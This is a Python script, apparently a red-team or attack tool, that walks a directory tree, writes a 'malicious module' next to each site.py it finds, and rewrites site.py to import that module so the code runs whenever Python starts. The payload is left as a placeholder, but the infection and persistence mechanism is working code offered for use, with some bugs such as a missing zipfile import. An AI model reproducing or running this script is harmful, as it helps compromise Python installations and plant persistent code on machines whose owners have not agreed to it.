"""
Iterate through the file system and inject a malicious module into all python files
@author: degenerat3
"""


import os
import re
import site
import sys

MODULE_CODE = "changeme"           # The malicious module source code file
DEST_MODULE_NAME = "changeme"       # The name of the module that will get dropped into sitepkg
#INCLUDE_LIST = ["datetime.py", "io.py", "operator.py", "os.py", "pickle.py", "random.py", "re.py", "socket.py", "stat.py", "string.py", "subprocess.py" ]  # A list of files we will infect


def get_pkg_dir(pth):
    """
    Find the correct directory for default packages
    @return: The path of the python site packages
    """
    site_loc = ""
    for subdir, dirs, files in os.walk(pth):        # iterate through everything
        for fil in files:
            fname = os.path.join(subdir, fil)
            if "site.py" in fname:                      # if it's site
                fname = fname.split("/")[:-1]
                fname = "".join(fname)                  # get the directory
                site_loc = fname
                return site_loc
    



def read_module_code(filename):
    """
    Read the source code for the malicious module into a string
    @param filename: the file holding the src code
    @return: a string containing the code
    """
    if sys.argv[0].endswith(".zip"):
        with zipfile.ZipFile(sys.argv[0]) as z:
            result = z.read(filename)
    else:
        with open(filename) as f:
            result = f.read()
    return result


def drop_module(dest_file_path):
    """
    Write the malicious module to the given path (likely /usr/lib/pythonX)
    @param dest_file_path: The destination of the malicious module
    @return: none
    """
    global MODULE_CODE
    print("DEST OF MOD: " + dest_file_path)
    mod_code = read_module_code(MODULE_CODE)
    with open(dest_file_path, "w") as f:
        f.write(mod_code)
    return


def find_site(search_pth):
    """
    Iterate through the given path and find all python files
    @param pth: the starting directory to search
    @return: an array of URIs of python files to infect
    """
    global DEST_MODULE_NAME
    py_files = []
    for subdir, dirs, files in os.walk(search_pth):        # iterate through everything
        for fil in files:
            fname = os.path.join(subdir, fil)
            if "site.py" in fname and "site.pyc" not in fname:                      # if it's the site module
                py_files.append(fname)
                finame = fname.split("/")[:-2]          # split down to just the directory
                finame = "/".join(finame) + DEST_MODULE_NAME
                drop_module(finame)                     # write the module to the dir

    return py_files


def infect_file(file_path):
    """
    Import the malicious module and add the malicious function to the given file
    @param file_path: the URI of the file to infect
    @return: none
    """
    global DEST_MODULE_NAME
    old_content = ""
    with open(file_path, "r") as f:
        old_content = f.read()      # read the contents of the file into a string
    
    if DEST_MODULE_NAME[:-3] in old_content:
        return      # return if it's already infected

    res = re.search('^import(.+?)\n', old_content)   # find the first import line
    if res:     
        current_imp = res.group(1)
        # make a new import block that has our module
        new_imp = current_imp + "\nimport " + DEST_MODULE_NAME[:-3]     
        new_con = old_content.replace(current_imp, new_imp, 1)     # insert the new import block
        with open(file_path, "w") as f:
            f.write(new_con)    # write the new content

    else:       # if there's no import block, just skip it, too much hassle
        return


def infect(search_dir):
    """
    The work horse function of the script; drops module and infects files
    @param search_dir: The directory to start the recursive search in
    @return: none
    """
    # mod_dest = get_pkg_dir() + "/" + DEST_MODULE_NAME   # establish location for malicious module
    # drop_module(mod_dest)   # write the module  DO THIS ELSEWHERE
    py_files = find_site(search_dir)  # find python
    for f in py_files:
        print("Infecting " + f + "...")
        infect_file(f)      # hack em
    return


def main():
    """
    Take argument from cmdline (if present), pass into "infect'
    """
    argc = len(sys.argv)
    if argc > 1:    # if user defined a directory, use it
        infection_dir = sys.argv[1]
    else:           # otherwise just use cwd
        infection_dir = os.getcwd()
    print("INFECTION DIR: " + infection_dir)
    infect(infection_dir)


main()